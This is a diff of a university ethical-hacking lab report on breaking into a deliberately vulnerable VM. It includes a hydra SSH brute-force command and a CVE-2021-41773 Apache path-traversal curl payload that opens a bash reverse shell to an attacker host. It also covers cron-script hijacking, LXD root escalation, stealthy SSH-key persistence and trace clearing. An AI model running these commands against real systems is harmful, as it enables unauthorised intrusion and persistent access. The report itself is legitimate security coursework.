@@ -1,3 +1,21 @@
+<center>
+<h1>
+Ethical Hacking Lab Assignment
+</h1>
+ 
+Penetration testing report<br/>
+<b>
+Group <code>0xe</code> - Owanesh, zBION1C, Frayu1600
+</b><br/>
+</center>
+
+---
+
+This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri for the Academic Year 23/24 at Sapienza University of Rome.
+
+We were given a virtual machine containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.
+
+
 # Troubleshooting
 As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
 ```sh
@@ -185,7 +203,7 @@ Since SSH is enabled, we tried to enumerate SSH users and guess their passwords 
 ```
 Which will take a long time, otherwise we could go by guessing and try the commonly used `ubuntu` username (even without seeing `/etc/passwd` from the previous path) and bruteforce off of it using the following command:
  ```sh
- ┌──(kali㉿kali)-[~/Desktop]
+┌──(kali㉿kali)-[~/Desktop]
 └─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -203,10 +221,29 @@ ubuntu@ubuntulab:~$
 ```
 
 ## 🔴 via Apache
-With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
+From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
+```sh
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo nmap -sV -A 192.168.56.2 --vulners -p8080
+```
+Many vulnerabilities show up, but a particular one caught our eye: CVE-2021-41773, which would allow remote code execution via path traversal. 
+
+After opening a listener on any ephemeral port on our attackbox, we managed to get a shell as the user `ftp-user` by executing the following code:
  ```sh
- curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
  ```
+Which effectively executes the following `HTTP POST` request 
+```sh 
+POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1 
+```
+In order for this exploit to work, the server configuration should also contain the following misconfigured directory directive for entire server’s filesystem (or have it missing)
+```sh
+<Directory />
+    Require all granted
+</Directory>
+```
+Additionally, the server would need the `mod_cgi` module enabled.
 
 # Privilege escalation
 Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.
@@ -233,7 +270,7 @@ nano ../scripts/health_check.sh
 vi ../scripts/health_check.sh
 less ../scripts/health_check.sh
 ```
-in his `/home` there are some files, maybe useful for privilege escalation later on... we'll see.
+in his `/home` there are some files, maybe useful for privilege escalation later on
 ```sh
 ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
 printenv  printenv.vbs	printenv.wsf  test-cgi
@@ -266,7 +303,7 @@ ubuntu@ubuntulab:~$ sudo su
 [sudo] password for ubuntu: 
 root@ubuntulab:/home/ubuntu#
 ```
-We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
+We are aware that this is a very trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
 
 ## 🟠 via Cronjob 
 By checking the `crontab` file, we noticed a particular:
@@ -279,7 +316,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 # Health Check Apache Server
 */1 * * * * root /usr/local/apache24/scripts/health_check.sh
 ```
-Last line: it was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`
+The last line of the file was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`
 
 ```sh
 -rwxrw-rw- 1 root ftp-user 415 Apr 30 14:07 /usr/local/apache24/scripts/health_check.sh
@@ -297,9 +334,7 @@ Then waiting 1 minute on average for the cron to execute the command and attach 
 Since the file is executed as root, the shell will be a root shell.
 
 ## 🔴 via LXD
-We could exploit `lxd`, mounting the file system with `root` privileges, which requires to be `sudoer`.
-
-Now, `ftp-user` is not a sudoer, but `ubuntu` is, therefore we wanted to include this path given the presence of `lxd` within the machine.
+We noticed the presence of `lxd` from `/etc/passwd`, so we tried exploiting it. We could think about mounting the file system with `root` privileges, but it would require to be `sudoer`. Thankfully, the `ubuntu` user is.
 
 ```sh
 ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
@@ -326,7 +361,11 @@ ubuntu@ubuntulab:~$ cat .ssh/id_rsa.pub >> .ssh/authorized_keys
 ```
 And now we can login via `ssh` into the `root` account whenever we want (assuming the machine is up and running) and without needing any password.
 
-It's important to note that
+It's important to note that this will work as long as the server's IP does not change. We are assuming that the server needs an exposed static IP, thus does not change. 
+
+We decided not to include other entry points for persitance because we believe that having few entry points but very stealthy ones is significantly better than having a big amount but obvious ones. Raising any kind of suspicion would trigger immediate action from the defender, who could think about doing a deeper scan on its system or even reinstalling everything from stratch on a new machine, effectively voiding all of our persistance efforts. 
+
+This way, we are maximising the time we are persiting into the target system.
 
 # Clearing our traces
 The job would not be complete without a proper cleanup of our traces. 
